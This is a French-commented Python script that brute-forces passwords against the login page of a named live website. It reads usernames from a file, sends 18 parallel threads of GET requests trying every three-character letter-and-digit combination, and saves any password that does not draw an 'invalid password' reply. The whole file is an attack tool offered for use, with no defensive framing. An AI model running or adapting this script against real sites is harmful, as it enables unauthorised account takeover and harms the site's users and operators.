# modules necessaires

import urllib.request as rq,time,threading,sys

global lettre,liste,number,number2

try:
	fd=open("login_found.txt",'r')
	liste=fd.readlines()
	fd.close()

except:
	print("login_found file not found ")
	sys.exit()



print(" \t\t DEMARRAGE DU MOTEUR  \n\n\t\t ...partie password ...\n\n")

lettre=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','0','1','2','3','4','5','6','7','8','9','']


def crack(rec):
    # initialisation des variables a utiliser
    long=36
    bou=1
    repo5=4
    num=3
    long2=0
    long3=0 
    rec=rec
    number=0
    number2=len(liste)
    x,y,z,u=0,0,0,0
    # algo pour traiter les decalage 
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=36:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        t1=time.time()
        user=(lettre[x]+lettre[y]+lettre[z])
        login=liste[number]
        x+=1
        # coeur du moteur... va permettre la generation ordonner des logins
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        # envoye ; reception ; et traitement automatique des requetes HTTP
        while bou:
            try:
                r = rq.urlopen('http://tkb.tg/login?username='+str(login)+'&password='+str(user))
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        # algo pour calculer le debit du bruteforce
        t2=time.time()
        t4=int(((t2-t1)*(36**3))//60)
        t3=int((1/(t2-t1))*18)
        # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
        if "invalid password" in str(r.read()):
            print("login {} || password {} incorrect ||  {}  pass/sec || {} min restant ".format(login,user,t3,t4),end="\r")
        else :
        	print("password  trouver : {}".format(user))
        	fd=open("pass_found.txt",'a')
        	fd.write("password : "+user+"\n")
        	fd.close()
        	if number< number2:
        		number+=1
        	elif number>=number2:
        		sys.exit()
            
            
# code spagetti pour booster X18 le programme
 
def crack1():
    rec=1
    crack(rec)
def crack2():
    rec=2
    crack(rec)
   
def crack3():
    rec=4
    crack(rec)

def crack4():
    rec=6
    crack(rec)

def crack5():
    rec=8
    crack(rec)

def crack6():
    rec=10
    crack(rec)

def crack7():
    rec=12
    crack(rec)

def crack8():
    rec=14
    crack(rec)

def crack9():
    rec=16
    crack(rec)

def crack10():
    rec=18
    crack(rec)

def crack11():
    rec=20
    crack(rec)

def crack12():
    rec=22
    crack(rec)

def crack13():
    rec=24
    crack(rec)

def crack14():
    rec=26
    crack(rec)

def crack15():
    rec=28
    crack(rec)

def crack16():
    rec=30
    crack(rec)

def crack17():
    rec=32
    crack(rec)

def crack18():
    rec=34
    crack(rec)

t1=threading.Thread(target=crack1)
t2=threading.Thread(target=crack2)
t3=threading.Thread(target=crack3)
t4=threading.Thread(target=crack4)
t5=threading.Thread(target=crack5)
t6=threading.Thread(target=crack6)
t7=threading.Thread(target=crack7)
t8=threading.Thread(target=crack8)
t9=threading.Thread(target=crack9)
t10=threading.Thread(target=crack10)
t11=threading.Thread(target=crack11)
t12=threading.Thread(target=crack12)
t13=threading.Thread(target=crack13)
t14=threading.Thread(target=crack9)
t15=threading.Thread(target=crack10)
t16=threading.Thread(target=crack11)
t17=threading.Thread(target=crack12)
t18=threading.Thread(target=crack13)

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()
t11.start()
t12.start()
t13.start()
t14.start()
t15.start()
t16.start()
t17.start()
t18.start()

t1.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
t8.join()
t9.join()
t10.join()
t11.join()
t12.join()
t13.join()
t14.join()
t15.join()
t16.join()
t17.join()
t18.join()

print("fermeture du moteur ,bye ")
time.sleep(2)
#  code source ecrit par toutpuissantged

